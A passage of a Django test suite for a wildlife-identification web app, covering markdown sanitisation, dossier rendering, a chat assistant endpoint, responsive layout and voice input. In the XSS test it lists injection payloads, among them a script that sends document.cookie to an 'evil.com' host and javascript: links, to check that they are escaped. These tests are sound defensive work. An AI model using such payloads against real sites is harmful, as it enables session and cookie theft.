        self.assertNotIn("href=\"javascript:alert(1)\"", rendered)

    def test_html_injection_attempts(self):
        """7. Raw HTML injection (XSS) is safely escaped and neutralized."""
        malicious_inputs = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert(1)>",
            "<svg onload=alert(document.domain)>",
            "<iframe src=\"https://attacker.com\"></iframe>",
            "Safe text <script>fetch('http://evil.com/cookie?c='+document.cookie)</script> more safe text"
        ]
        for payload in malicious_inputs:
            rendered = render_markdown_safe(payload)
            # Ensure literal <script>, <img>, <iframe> tags are NOT rendered as executable HTML
            self.assertNotIn("<script>", rendered)
            self.assertNotIn("<img", rendered)
            self.assertNotIn("<svg", rendered)
            self.assertNotIn("<iframe", rendered)
            # Ensure escaped characters exist instead
            self.assertIn("&lt;", rendered)

        # Test template tag directly
        dossier_html = render_dossier("<script>alert('test')</script>")
        self.assertNotIn("<script>", dossier_html)
        self.assertIn("&lt;script&gt;", dossier_html)

    def test_previously_stored_dossier_content(self):
        """8. Previously stored legacy dossier content with Python repr string is safely cleaned without eval."""
        legacy_str = (
            "[{'type': 'text', 'text': '### Scarlet Macaw\\n\\n**Family:** Psittacidae\\n"
            "- Vivid coloration\\n- Strong hooked beak', "
            "'extras': {'signature': 'mock_sig_123', 'status': 'valid'}}]"
        )
        cleaned = extract_clean_message_text(legacy_str)
        self.assertIn("### Scarlet Macaw", cleaned)
        self.assertIn("**Family:** Psittacidae", cleaned)
        self.assertIn("- Vivid coloration", cleaned)
        self.assertNotIn("mock_sig_123", cleaned)
        self.assertNotIn("extras", cleaned)
        self.assertNotIn("'type': 'text'", cleaned)

        # Test on AnimalPrediction model properties
        pred = AnimalPrediction.objects.create(
            user=self.user,
            common_name="Scarlet Macaw",
            scientific_name="Ara macao",
            identification_status="identified",
            wildlife_information={"summary": legacy_str},
            source_references=[{"title": "GBIF", "url": "https://www.gbif.org/species/2479532"}]
        )
        self.assertIn("### Scarlet Macaw", pred.clean_wildlife_summary)
        self.assertNotIn("mock_sig_123", pred.clean_wildlife_summary)
        self.assertIn("<h3>Scarlet Macaw</h3>", pred.rendered_dossier)
        self.assertIn("<strong>Family:</strong> Psittacidae", pred.rendered_dossier)

        # Test on WildlifeMessage model properties
        conv = WildlifeConversation.objects.create(user=self.user, prediction=pred)
        msg = WildlifeMessage.objects.create(
            conversation=conv,
            role="assistant",
            content=legacy_str
        )
        self.assertIn("### Scarlet Macaw", msg.clean_content)
        self.assertNotIn("mock_sig_123", msg.clean_content)
        self.assertIn("<h3>Scarlet Macaw</h3>", msg.rendered_content)

    def test_prediction_detail_template_renders_formatted_dossier(self):
        """9. Full prediction_detail view renders formatted HTML without raw metadata or markdown syntax."""
        pred = AnimalPrediction.objects.create(
            user=self.user,
            common_name="Bengal Tiger",
            scientific_name="Panthera tigris tigris",
            identification_status="identified",
            wildlife_information={"summary": "### Apex Predator\n\nThe Bengal Tiger is an **endangered** feline."},
            source_references=[{"title": "IUCN Red List", "url": "https://www.iucnredlist.org/species/15955/214862019"}]
        )
        conv = WildlifeConversation.objects.create(user=self.user, prediction=pred)
        WildlifeMessage.objects.create(
            conversation=conv,
            role="assistant",
            content="**Diet:** Deer, wild boar, and water buffalo."
        )

        res = self.client.get(reverse("prediction_detail", kwargs={"prediction_id": pred.id}))
        self.assertEqual(res.status_code, 200)

        html = res.content.decode("utf-8")
        # Dossier rendered with modern structured section cards
        self.assertIn("dossier-section-title", html)
        self.assertIn("Apex Predator", html)
        self.assertIn("<strong>endangered</strong>", html)
        self.assertNotIn("### Apex Predator", html)

        # Assistant message rendered with HTML tags
        self.assertIn("<strong>Diet:</strong>", html)
        self.assertNotIn("**Diet:**", html)

        # Verified source displayed safely with target="_blank"
        self.assertIn("https://www.iucnredlist.org/species/15955/214862019", html)
        self.assertIn("target=\"_blank\"", html)
        self.assertIn("rel=\"noopener noreferrer\"", html)

    @patch("animal.views.run_wildlife_agent")
    def test_assistant_chat_ajax_returns_rendered_answer(self, mock_agent):
        """10. Assistant chat JSON endpoint returns clean answer, rendered_answer HTML, and sanitized sources."""
        pred = AnimalPrediction.objects.create(
            user=self.user,
            common_name="Asian Elephant",
            scientific_name="Elephas maximus",
            identification_status="identified"
        )
        conv = WildlifeConversation.objects.create(user=self.user, prediction=pred)

        mock_reply = AIMessage(
            content=[
                {
                    "type": "text",
                    "text": "### Habitat\nElephants inhabit **tropical forests** and grasslands.",
                    "extras": {"signature": "elephant_sig_999"}
                }
            ]
        )
        mock_agent.return_value = {
            "messages": [mock_reply],
            "source_references": [
                {"title": "GBIF Elephas", "url": "https://www.gbif.org/species/2479532"},
                {"title": "Bad Link", "url": "javascript:alert(1)"}
            ]
        }

        res = self.client.post(
            reverse("assistant_chat"),
            json.dumps({"conversation_id": conv.id, "message": "Where does this elephant live?"}),
            content_type="application/json"
        )
        self.assertEqual(res.status_code, 200)
        data = res.json()
        self.assertTrue(data["success"])

        # Answer is clean markdown
        self.assertIn("### Habitat", data["answer"])
        self.assertNotIn("elephant_sig_999", data["answer"])
        self.assertNotIn("extras", data["answer"])

        # Rendered answer is clean HTML
        self.assertIn("<h3>Habitat</h3>", data["rendered_answer"])
        self.assertIn("<strong>tropical forests</strong>", data["rendered_answer"])
        self.assertNotIn("### Habitat", data["rendered_answer"])

        # Sources are sanitized (bad javascript link stripped)
        self.assertEqual(len(data["sources"]), 1)
        self.assertEqual(data["sources"][0]["url"], "https://www.gbif.org/species/2479532")


# ===========================================================================
# 12. Phase 1 — Modern Animal Result UI Tests
# ===========================================================================

class ModernAnimalResultUITests(TestCase):
    def setUp(self):
        self.client = Client()
        self.user = User.objects.create_user(
            username="wildlife_observer",
            email="observer@wildlens.org",
            password="StrongPassword123!"
        )
        self.client.login(username="wildlife_observer", password="StrongPassword123!")
        self.profile, _ = Profile.objects.get_or_create(user=self.user)
        self.profile.wallet_balance = Decimal("10.00")
        self.profile.save()

    def test_organize_dossier_sections_parses_markdown_headers(self):
        """Verify organize_dossier_sections parses markdown headings into structured cards with icons."""
        markdown_text = (
            "### 1. Species Overview\n"
            "The Bengal Tiger is an iconic apex predator.\n\n"
            "### 2. Physical Characteristics\n"
            "Characterized by reddish-orange coat with dark vertical stripes.\n\n"
            "### 3. Diet & Hunting Behavior\n"
            "Preys mainly on large ungulates such as chital and sambar."
        )
        sections = organize_dossier_sections(markdown_text)
        self.assertEqual(len(sections), 3)

        self.assertEqual(sections[0]["title"], "Species Overview")
        self.assertIn("bi bi-", sections[0]["icon"])
        self.assertIn("apex predator", sections[0]["content_html"])

        self.assertEqual(sections[1]["title"], "Physical Characteristics")
        self.assertEqual(sections[1]["icon"], "bi bi-eye")
        self.assertIn("dark vertical stripes", sections[1]["content_html"])

        self.assertEqual(sections[2]["title"], "Diet & Hunting Behavior")
        self.assertEqual(sections[2]["icon"], "bi bi-egg-fried")
        self.assertIn("chital and sambar", sections[2]["content_html"])

    def test_organize_dossier_sections_appends_verified_references(self):
        """Verify organize_dossier_sections appends Section 10 Verified References with external links."""
        wildlife_info = "### Overview\nBengal Tiger in Sundarbans."
        sources = [
            {"title": "IUCN Red List", "url": "https://www.iucnredlist.org/species/15955", "source": "IUCN"},
            {"title": "GBIF Registry", "url": "https://www.gbif.org/species/5219404", "source": "GBIF"}
        ]
        sections = organize_dossier_sections(wildlife_info, sources)
        self.assertEqual(len(sections), 2)
        ref_sec = sections[1]
        self.assertEqual(ref_sec["title"], "Verified References")
        self.assertEqual(ref_sec["icon"], "bi bi-journal-bookmark")
        self.assertTrue(ref_sec["is_references"])
        self.assertIn('target="_blank"', ref_sec["content_html"])
        self.assertIn('rel="noopener noreferrer"', ref_sec["content_html"])
        self.assertIn("https://www.iucnredlist.org/species/15955", ref_sec["content_html"])
        self.assertIn("https://www.gbif.org/species/5219404", ref_sec["content_html"])

    def test_organize_dossier_sections_handles_empty_or_plain_text(self):
        """Verify empty and plain text dossiers are structured gracefully without artificial splitting."""
        # Empty text fallback
        empty_sections = organize_dossier_sections("")
        self.assertEqual(len(empty_sections), 1)
        self.assertEqual(empty_sections[0]["title"], "Wildlife Dossier")
        self.assertIn("Not verified or not available", empty_sections[0]["content_html"])

        # Plain text without headers
        plain_sections = organize_dossier_sections("The Indian leopard is widely distributed in South Asia.")
        self.assertEqual(len(plain_sections), 1)
        self.assertEqual(plain_sections[0]["title"], "Wildlife Overview & Biology")
        self.assertIn("Indian leopard", plain_sections[0]["content_html"])

    def test_get_dossier_sections_template_tag(self):
        """Verify get_dossier_sections template tag produces structured section list."""
        sections = get_dossier_sections("### Habitat\nNative to grasslands.", [{"url": "https://example.com"}])
        self.assertIsInstance(sections, list)
        self.assertEqual(sections[0]["title"], "Habitat")

        filter_sections = dossier_sections("### Taxonomy\nOrder Carnivora.")
        self.assertIsInstance(filter_sections, list)
        self.assertEqual(filter_sections[0]["title"], "Taxonomy")

    @patch("animal.views.run_wildlife_agent")
    @patch("animal.views.validate_and_process_image")
    def test_predict_page_renders_modern_animal_summary_card_and_dossier(self, mock_validate, mock_agent):
        """Verify predict page renders modern Animal Summary Card, visual clues, alt species, and dossier."""
        test_img = create_test_image(filename="tiger.png")
        mock_validate.return_value = (b"fake_image_bytes", "PNG")
        mock_agent.return_value = {
            "final_result": {
                "identification_status": "identified",
                "common_name": "Bengal Tiger",
                "scientific_name": "Panthera tigris tigris",
                "identification_notes": "Prominent facial markings and striped coat.",
                "visual_clues": ["Orange coat with black stripes", "White belly patch", "Muscular build"],
                "alternative_species": ["Indochinese Tiger", "Siberian Tiger"],
                "wildlife_information": "### 1. Species Overview\nApex predator.\n### 2. Diet\nCarnivorous diet.",
                "source_references": [{"title": "GBIF Tiger", "url": "https://www.gbif.org/species/5219404"}]
            }
        }

        res = self.client.post(reverse("predict"), {"image": test_img})
        self.assertEqual(res.status_code, 200)
        html = res.content.decode("utf-8")

        # 1. Animal Summary Card & Typography
        self.assertIn("animal-summary-card", html)
        self.assertIn("Bengal Tiger", html)
        self.assertIn("Panthera tigris tigris", html)
        self.assertIn("badge-status-identified", html)

        # 2. Visual clues and alternative species
        self.assertIn("Orange coat with black stripes", html)
        self.assertIn("White belly patch", html)
        self.assertIn("clue-item", html)
        self.assertIn("Indochinese Tiger", html)
        self.assertIn("alt-species-badge", html)

        # 3. Quick link to dossier
        self.assertIn('href="#wildlife-dossier"', html)

        # 4. Grounded Wildlife Dossier Section Cards
        self.assertIn("dossier-section-card", html)
        self.assertIn("dossier-section-title", html)
        self.assertIn("Species Overview", html)
        self.assertIn("Diet", html)

        # 5. Verified References with external target="_blank"
        self.assertIn('target="_blank"', html)
        self.assertIn('rel="noopener noreferrer"', html)
        self.assertIn("https://www.gbif.org/species/5219404", html)

        # 6. Strict Phase 1 constraints: No voice input or sticky scripts
        self.assertNotIn("wildlife-voice.js", html)
        self.assertNotIn("voice-input-btn", html)
        self.assertNotIn("sticky-specimen-sidebar", html)

    @patch("animal.views.run_wildlife_agent")
    @patch("animal.views.validate_and_process_image")
    def test_predict_page_uncertain_status_shows_warning_banner(self, mock_validate, mock_agent):
        """Verify uncertain identification displays warning banner in the summary card."""
        test_img = create_test_image(filename="uncertain.png")
        mock_validate.return_value = (b"fake_image_bytes", "PNG")
        mock_agent.return_value = {
            "final_result": {
                "identification_status": "uncertain",
                "common_name": "Canid (Uncertain)",
                "scientific_name": "Canis sp.",
                "identification_notes": "Low confidence match due to lighting.",
                "visual_clues": ["Canine snout", "Pointed ears"],
                "alternative_species": ["Golden Jackal", "Indian Wolf"],
                "wildlife_information": "### Overview\nCanid species specimen.",
                "source_references": []
            }
        }

        res = self.client.post(reverse("predict"), {"image": test_img})
        self.assertEqual(res.status_code, 200)
        html = res.content.decode("utf-8")

        self.assertIn("badge-status-uncertain", html)
        self.assertIn("alert-warning", html)
        self.assertIn("Tentative Identification", html)

    def test_prediction_detail_modern_dossier_and_clean_ui(self):
        """Verify prediction_detail renders modern structured dossier and no voice or sticky markup."""
        pred = AnimalPrediction.objects.create(
            user=self.user,
            common_name="Asian Elephant",
            scientific_name="Elephas maximus",
            identification_status="identified",
            wildlife_information="### 1. Species Overview\nLargest terrestrial animal in Asia.\n### 2. Conservation\nEndangered on IUCN Red List.",
            source_references=[{"title": "IUCN Elephant", "url": "https://www.iucnredlist.org/species/7140"}]
        )
        conv = WildlifeConversation.objects.create(user=self.user, prediction=pred)
        WildlifeMessage.objects.create(
            conversation=conv,
            role="assistant",
            content="Asian elephants inhabit tropical and subtropical forests."
        )

        res = self.client.get(reverse("prediction_detail", kwargs={"prediction_id": pred.id}))
        self.assertEqual(res.status_code, 200)
        html = res.content.decode("utf-8")

        # Modern dossier section cards
        self.assertIn("dossier-section-card", html)
        self.assertIn("dossier-section-title", html)
        self.assertIn("Species Overview", html)
        self.assertIn("Conservation", html)
        self.assertIn("Largest terrestrial animal in Asia", html)

        # Verified external reference
        self.assertIn('target="_blank"', html)
        self.assertIn('rel="noopener noreferrer"', html)
        self.assertIn("https://www.iucnredlist.org/species/7140", html)

        # Strict Phase 1 constraints: No voice scripts or voice input
        self.assertNotIn("wildlife-voice.js", html)
        self.assertNotIn("voice-input-btn", html)
        self.assertNotIn("sticky-specimen-sidebar", html)


# ===========================================================================
# 13. Phase 2 — Sticky Layout and Mobile Assistant Tests
# ===========================================================================

class Phase2StickyLayoutAndMobileAssistantTests(TestCase):
    def setUp(self):
        self.client = Client()
        self.user = User.objects.create_user(
            username="sticky_tester",
            email="sticky@wildlens.org",
            password="StrongPassword123!"
        )
        self.client.login(username="sticky_tester", password="StrongPassword123!")
        self.profile, _ = Profile.objects.get_or_create(user=self.user)
        self.profile.wallet_balance = Decimal("10.00")
        self.profile.save()

        self.prediction = AnimalPrediction.objects.create(
            user=self.user,
            common_name="Snow Leopard",
            scientific_name="Panthera uncia",
            identification_status="identified",
            identification_notes="Spotted high-altitude felid with thick grey-white fur.",
            visual_clues=["Thick smoke-grey fur", "Rosette markings", "Long muscular tail"],
            alternative_species=["Clouded Leopard", "Common Leopard"],
            wildlife_information=(
                "### 1. Species Overview\n"
                "The snow leopard is an elusive big cat native to Central and South Asia.\n\n"
                "### 2. Habitat & Geography\n"
                "Inhabits alpine and subalpine zones at elevations of 3,000 to 4,500 m.\n\n"
                "### 3. Conservation Status\n"
                "Listed as Vulnerable on the IUCN Red List."
            ),
            source_references=[
                {"title": "IUCN Snow Leopard", "url": "https://www.iucnredlist.org/species/22732", "source": "IUCN"},
                {"title": "GBIF Registry", "url": "https://www.gbif.org/species/2435105", "source": "GBIF"}
            ]
        )
        self.conversation = WildlifeConversation.objects.create(
            user=self.user,
            prediction=self.prediction,
            title="Snow Leopard Inquiry"
        )
        WildlifeMessage.objects.create(
            conversation=self.conversation,
            role="assistant",
            content="Snow leopards are solitary predators with large home ranges."
        )

    def test_desktop_two_column_layout_and_sticky_panel(self):
        """Verify responsive 2-column layout with natural dossier scroll on left and sticky assistant on right."""
        res = self.client.get(reverse("prediction_detail", kwargs={"prediction_id": self.prediction.id}))
        self.assertEqual(res.status_code, 200)
        html = res.content.decode("utf-8")

        # Two-column grid container
        self.assertIn("sticky-layout-row", html)
        self.assertIn("col-lg-7", html)
        self.assertIn("col-lg-5", html)

        # Left Column: Compact summary card, Grounded dossier, Verified sources
        self.assertIn("animal-summary-card", html)
        self.assertIn("Snow Leopard", html)
        self.assertIn("Panthera uncia", html)
        self.assertIn("dossier-container", html)
        self.assertIn("dossier-section-card", html)
        self.assertIn("Species Overview", html)
        self.assertIn("Habitat", html)
        self.assertIn("Conservation Status", html)

        # Right Column: Sticky assistant panel with native CSS sticky class
        self.assertIn("sticky-assistant-panel", html)
        self.assertIn("chat-container", html)
        self.assertIn("chat-thread", html)
        self.assertIn("suggested-chips-container", html)
        self.assertIn("chat-input-area", html)

    def test_mobile_offcanvas_and_accessible_launcher(self):
        """Verify Bootstrap Offcanvas integration and floating launcher button for mobile devices."""
        res = self.client.get(reverse("prediction_detail", kwargs={"prediction_id": self.prediction.id}))
        self.assertEqual(res.status_code, 200)
        html = res.content.decode("utf-8")

        # Offcanvas markup for mobile
        self.assertIn("offcanvas-lg", html)
        self.assertIn("offcanvas-end", html)
        self.assertIn('id="assistantOffcanvas"', html)
        self.assertIn('role="dialog"', html)
        self.assertIn('aria-labelledby="assistantOffcanvasLabel"', html)

        # Mobile close button inside offcanvas header
        self.assertIn("btn-close d-lg-none", html)
        self.assertIn('data-bs-dismiss="offcanvas"', html)

        # Floating launcher button for mobile devices
        self.assertIn("mobile-assistant-launcher", html)
        self.assertIn("d-lg-none", html)
        self.assertIn('data-bs-toggle="offcanvas"', html)
        self.assertIn('data-bs-target="#assistantOffcanvas"', html)
        self.assertIn('aria-controls="assistantOffcanvas"', html)
        self.assertIn('id="mobile-msg-badge"', html)

    def test_compact_animal_summary_elements(self):
        """Verify compact animal identity section at top of result area shows all required fields."""
        res = self.client.get(reverse("prediction_detail", kwargs={"prediction_id": self.prediction.id}))
        self.assertEqual(res.status_code, 200)
        html = res.content.decode("utf-8")

        self.assertIn("animal-summary-image-wrapper", html)
        self.assertIn("badge-status-identified", html)
        self.assertIn("Thick smoke-grey fur", html)
        self.assertIn("Rosette markings", html)
        self.assertIn("clue-item", html)
        self.assertIn("Clouded Leopard", html)
        self.assertIn("alt-species-badge", html)
        self.assertIn("Jump to Dossier", html)

    def test_css_sticky_and_mobile_rules(self):
        """Verify style.css contains required CSS sticky positioning, offcanvas, and safe-area rules."""
        import os
        from django.conf import settings
        css_path = os.path.join(settings.BASE_DIR, "static", "css", "style.css")
        with open(css_path, "r", encoding="utf-8") as f:
            css = f.read()

        # Desktop sticky rules
        self.assertIn(".sticky-assistant-panel", css)
        self.assertIn("position: sticky", css)
        self.assertIn("top: 90px", css)
        self.assertIn("calc(100vh - 105px)", css)

        # Mobile offcanvas rules
        self.assertIn(".sticky-assistant-panel.offcanvas-lg", css)
        self.assertIn(".mobile-assistant-launcher", css)
        self.assertIn("env(safe-area-inset-bottom", css)

        # Accessibility and reduced motion
        self.assertIn("prefers-reduced-motion: reduce", css)
        self.assertIn("focus-visible", css)

    @patch("animal.views.run_wildlife_agent")
    def test_chat_interaction_preserves_conversation_state_in_sticky_panel(self, mock_agent):
        """Verify conversation messages are stored and rendered accurately in the sticky chat panel."""
        mock_agent.return_value = {
            "messages": [AIMessage(content="Snow leopards prey primarily on blue sheep and Asiatic ibex.")],
            "final_result": {
                "source_references": [{"title": "Snow Leopard Trust", "url": "https://snowleopard.org"}]
            }
        }

        # Send follow-up question via AJAX endpoint
        res = self.client.post(
            reverse("assistant_chat"),
            data=json.dumps({
                "conversation_id": self.conversation.id,
                "message": "What do snow leopards eat?"
            }),
            content_type="application/json"
        )
        self.assertEqual(res.status_code, 200)
        data = res.json()
        self.assertTrue(data["success"])
        self.assertIn("blue sheep", data["answer"])

        # Check that message was persisted in SQLite
        db_messages = WildlifeMessage.objects.filter(conversation=self.conversation)
        self.assertEqual(db_messages.count(), 3)  # Initial + user question + assistant answer

        # Check that page re-render includes updated history
        page_res = self.client.get(reverse("prediction_detail", kwargs={"prediction_id": self.prediction.id}))
        page_html = page_res.content.decode("utf-8")
        self.assertIn("What do snow leopards eat?", page_html)
        self.assertIn("blue sheep", page_html)

    def test_strict_phase_2_constraints_no_voice(self):
        """Verify no deferred voice controls or unapproved script assets exist."""
        res = self.client.get(reverse("prediction_detail", kwargs={"prediction_id": self.prediction.id}))
        html = res.content.decode("utf-8")
        self.assertNotIn("wildlife-voice.js", html)
        self.assertNotIn("voice-input-btn", html)
        self.assertNotIn("voice-status-bar", html)


# ===========================================================================
# 14. Phase 3 — Modern WildLens Assistant UI Tests
# ===========================================================================

class Phase3ModernAssistantUITests(TestCase):
    def setUp(self):
        self.client = Client()
        self.user = User.objects.create_user(
            username="assistant_tester",
            email="tester@wildlens.org",
            password="StrongPassword123!"
        )
        self.client.login(username="assistant_tester", password="StrongPassword123!")
        self.profile, _ = Profile.objects.get_or_create(user=self.user)
        self.profile.wallet_balance = Decimal("10.00")
        self.profile.save()

        self.prediction = AnimalPrediction.objects.create(
            user=self.user,
            common_name="Red Panda",
            scientific_name="Ailurus fulgens",
            identification_status="identified",
            identification_notes="Arboreal mammal with reddish-brown fur and a ringed tail.",
            visual_clues=["Reddish-brown coat", "White snout", "Ringed tail"],
            alternative_species=["Giant Panda", "Raccoon"],
            wildlife_information="### 1. Species Overview\nNative to the eastern Himalayas.",
            source_references=[{"title": "Red Panda Network", "url": "https://redpandanetwork.org", "source": "RPN"}]
        )
        self.conversation = WildlifeConversation.objects.create(
            user=self.user,
            prediction=self.prediction,
            title="Red Panda Inquiry"
        )
        WildlifeMessage.objects.create(
            conversation=self.conversation,
            role="assistant",
            content="Red pandas feed predominantly on bamboo shoots and leaves."
        )

    def test_modern_chat_header_and_status_elements(self):
        """Verify modern chat header contains title, robot icon, ready status pill, and counter."""
        res = self.client.get(reverse("prediction_detail", kwargs={"prediction_id": self.prediction.id}))
        self.assertEqual(res.status_code, 200)
        html = res.content.decode("utf-8")

        self.assertIn("WildLens Assistant", html)
        self.assertIn("bi bi-robot", html)
        self.assertIn("assistant-status-pill", html)
        self.assertIn("Ready", html)
        self.assertIn('id="msg-counter"', html)

    def test_message_design_user_and_assistant_bubbles(self):
        """Verify distinct user/assistant bubbles, copy button, and timestamp metadata."""
        # Add a user message to test rendering
        WildlifeMessage.objects.create(
            conversation=self.conversation,
            role="user",
            content="What is their primary habitat?"
        )
        res = self.client.get(reverse("prediction_detail", kwargs={"prediction_id": self.prediction.id}))
        self.assertEqual(res.status_code, 200)
        html = res.content.decode("utf-8")

        # User bubble
        self.assertIn("user-message-row", html)
        self.assertIn("chat-bubble-user", html)
        self.assertIn("What is their primary habitat?", html)

        # Assistant bubble
        self.assertIn("assistant-message-row", html)
        self.assertIn("chat-bubble-assistant", html)
        self.assertIn("btn-msg-copy", html)
        self.assertIn("bi bi-clipboard", html)
        self.assertIn("Red pandas feed predominantly on bamboo", html)

    def test_multiline_composer_and_keyboard_hints(self):
        """Verify multiline textarea composer, auto-resize styling, and keyboard submission hints."""
        res = self.client.get(reverse("prediction_detail", kwargs={"prediction_id": self.prediction.id}))
        self.assertEqual(res.status_code, 200)
        html = res.content.decode("utf-8")

        self.assertIn("chat-composer-wrapper", html)
        self.assertIn("<textarea", html)
        self.assertIn('id="chat-input"', html)
        self.assertIn('chat-composer-textarea', html)
        self.assertIn("Enter", html)
        self.assertIn("Shift+Enter", html)
        self.assertIn('id="char-counter"', html)
        self.assertIn('id="chat-send-btn"', html)

    def test_error_banner_and_retry_controls(self):
        """Verify presence of error banner and retry action button."""
        res = self.client.get(reverse("prediction_detail", kwargs={"prediction_id": self.prediction.id}))
        self.assertEqual(res.status_code, 200)
        html = res.content.decode("utf-8")

        self.assertIn('id="chat-error-alert"', html)
        self.assertIn('id="chat-retry-btn"', html)

    @patch("animal.views.run_wildlife_agent")
    def test_assistant_chat_ajax_interaction_and_sqlite_persistence(self, mock_agent):
        """Verify AJAX interaction with assistant_chat, response extraction, and SQLite persistence."""
        mock_agent.return_value = {
            "messages": [AIMessage(content="Red pandas live in temperate forests with bamboo understories.")],
            "final_result": {
                "source_references": [{"title": "GBIF Red Panda", "url": "https://www.gbif.org/species/5219404"}]
            }
        }

        res = self.client.post(
            reverse("assistant_chat"),
            data=json.dumps({
                "conversation_id": self.conversation.id,
                "message": "Where do they live?"
            }),
            content_type="application/json"
        )
        self.assertEqual(res.status_code, 200)
        data = res.json()
        self.assertTrue(data["success"])
        self.assertIn("temperate forests", data["answer"])
        self.assertIn("temperate forests", data["rendered_answer"])
        self.assertEqual(len(data["sources"]), 1)
        self.assertEqual(data["sources"][0]["url"], "https://www.gbif.org/species/5219404")

        # Verify SQLite persistence
        latest_user_msg = WildlifeMessage.objects.filter(conversation=self.conversation, role="user").order_by("-id").first()
        self.assertEqual(latest_user_msg.content, "Where do they live?")

        latest_asst_msg = WildlifeMessage.objects.filter(conversation=self.conversation, role="assistant").order_by("-id").first()
        self.assertIn("temperate forests", latest_asst_msg.content)

    @patch("animal.views.run_wildlife_agent")
    def test_assistant_chat_hindi_query_handling(self, mock_agent):
        """Verify multilingual queries in Hindi are supported seamlessly."""
        mock_agent.return_value = {
            "messages": [AIMessage(content="लाल पांडा मुख्य रूप से बांस की पत्तियां खाते हैं।")],
            "final_result": {}
        }

        res = self.client.post(
            reverse("assistant_chat"),
            data=json.dumps({
                "conversation_id": self.conversation.id,
                "message": "लाल पांडा क्या खाता है?"
            }),
            content_type="application/json"
        )
        self.assertEqual(res.status_code, 200)
        data = res.json()
        self.assertTrue(data["success"])
        self.assertIn("बांस की पत्तियां", data["answer"])

    def test_long_message_validation(self):
        """Verify messages exceeding 1000 characters are rejected with validation error."""
        res = self.client.post(
            reverse("assistant_chat"),
            data=json.dumps({
                "conversation_id": self.conversation.id,
                "message": "A" * 1001
            }),
            content_type="application/json"
        )
        self.assertEqual(res.status_code, 400)
        data = res.json()
        self.assertFalse(data["success"])
        self.assertIn("1000 characters", data["error"])

    def test_empty_message_validation(self):
        """Verify empty or whitespace-only messages are rejected."""
        res = self.client.post(
            reverse("assistant_chat"),
            data=json.dumps({
                "conversation_id": self.conversation.id,
                "message": "   "
            }),
            content_type="application/json"
        )
        self.assertEqual(res.status_code, 400)
        data = res.json()
        self.assertFalse(data["success"])
        self.assertIn("empty", data["error"])

    def test_strict_phase_3_no_speech_recognition(self):
        """Verify no speech recognition or TTS features are present in Phase 3."""
        res = self.client.get(reverse("prediction_detail", kwargs={"prediction_id": self.prediction.id}))
        html = res.content.decode("utf-8")
        self.assertNotIn("wildlife-voice.js", html)
        self.assertNotIn("voice-input-btn", html)
        self.assertNotIn("btn-msg-speak", html)


# ===========================================================================
# 15. Phase 4 — Voice Input with Speech Recognition Tests
# ===========================================================================

class Phase4VoiceInputTests(TestCase):
    def setUp(self):
        self.client = Client()
        self.user = User.objects.create_user(
            username="voice_tester",
            email="voicetester@wildlens.org",
            password="StrongPassword123!"
        )
        self.client.login(username="voice_tester", password="StrongPassword123!")
        self.profile, _ = Profile.objects.get_or_create(user=self.user)
        self.profile.wallet_balance = Decimal("10.00")
        self.profile.save()

        self.prediction = AnimalPrediction.objects.create(
            user=self.user,
            common_name="Bengal Tiger",
            scientific_name="Panthera tigris tigris",
            identification_status="identified",
            identification_notes="Large felid with reddish-orange coat and black vertical stripes.",
            visual_clues=["Black stripes", "Orange coat", "White underparts"],
            wildlife_information="### 1. Species Overview\nApex predator native to the Indian subcontinent.",
            source_references=[{"title": "IUCN Red List", "url": "https://www.iucnredlist.org", "source": "IUCN"}]
        )
        self.conversation = WildlifeConversation.objects.create(
            user=self.user,
            prediction=self.prediction,
            title="Bengal Tiger Voice Chat"
        )

    def test_voice_microphone_button_and_elements_rendered(self):
        """Verify microphone button, icons, live interim panel, and error elements are rendered."""
        res = self.client.get(reverse("prediction_detail", kwargs={"prediction_id": self.prediction.id}))
        self.assertEqual(res.status_code, 200)
        html = res.content.decode("utf-8")

        # Microphone button & icon
        self.assertIn('id="chat-mic-btn"', html)
        self.assertIn('id="mic-icon"', html)
        self.assertIn("bi bi-mic", html)
        self.assertIn("btn-voice-mic", html)

        # Voice interim & live transcription panel
        self.assertIn('id="voice-live-panel"', html)
        self.assertIn('id="voice-status-text"', html)
        self.assertIn('id="voice-interim-preview"', html)
        self.assertIn('id="voice-stop-btn"', html)

        # Voice error & permission alert
        self.assertIn('id="voice-error-alert"', html)
        self.assertIn('id="voice-error-text"', html)

    def test_language_selector_options(self):
        """Verify compact language selector supports English (India) and Hindi (India)."""
        res = self.client.get(reverse("prediction_detail", kwargs={"prediction_id": self.prediction.id}))
        self.assertEqual(res.status_code, 200)
        html = res.content.decode("utf-8")

        self.assertIn('id="voice-lang-select"', html)
        self.assertIn('value="en-IN"', html)
        self.assertIn('English (IN)', html)
        self.assertIn('value="hi-IN"', html)
        self.assertIn('हिंदी (IN)', html)

    def test_browser_speech_recognition_web_api_script(self):
        """Verify browser Web Speech API feature detection and configuration in client script."""
        res = self.client.get(reverse("prediction_detail", kwargs={"prediction_id": self.prediction.id}))
        self.assertEqual(res.status_code, 200)
        html = res.content.decode("utf-8")

        # Feature detection
        self.assertIn("window.SpeechRecognition || window.webkitSpeechRecognition", html)
        self.assertIn("isSpeechSupported", html)

        # Recognition settings
        self.assertIn("recognition.continuous = false", html)
        self.assertIn("recognition.interimResults = true", html)
        self.assertIn("recognition.maxAlternatives = 1", html)

        # Language binding
        self.assertIn("recognition.lang = voiceLangSelect", html)

    def test_voice_error_handling_states_in_script(self):
        """Verify error handlers exist for permission denied, no-speech, hardware, and network."""
        res = self.client.get(reverse("prediction_detail", kwargs={"prediction_id": self.prediction.id}))
        self.assertEqual(res.status_code, 200)
        html = res.content.decode("utf-8")

        self.assertIn("not-allowed", html)
        self.assertIn("permission-denied", html)
        self.assertIn("no-speech", html)
        self.assertIn("audio-capture", html)
        self.assertIn("network", html)
        self.assertIn("service-not-allowed", html)
        self.assertIn("updateMicState('error')", html)
        self.assertIn("updateMicState('unsupported')", html)

    def test_stop_listening_and_cleanup(self):
        """Verify stopListening function, stop button, and beforeunload cleanup exist in script."""
        res = self.client.get(reverse("prediction_detail", kwargs={"prediction_id": self.prediction.id}))
        self.assertEqual(res.status_code, 200)
        html = res.content.decode("utf-8")

        self.assertIn("function stopListening()", html)
        self.assertIn("voiceStopBtn.addEventListener('click'", html)
        self.assertIn("window.addEventListener('beforeunload'", html)

    def test_text_preservation_and_no_auto_send(self):
        """Verify recognition preserves previously typed text and does not auto-submit."""
        res = self.client.get(reverse("prediction_detail", kwargs={"prediction_id": self.prediction.id}))
        self.assertEqual(res.status_code, 200)
        html = res.content.decode("utf-8")

        # Text preservation
        self.assertIn("baseInputText", html)
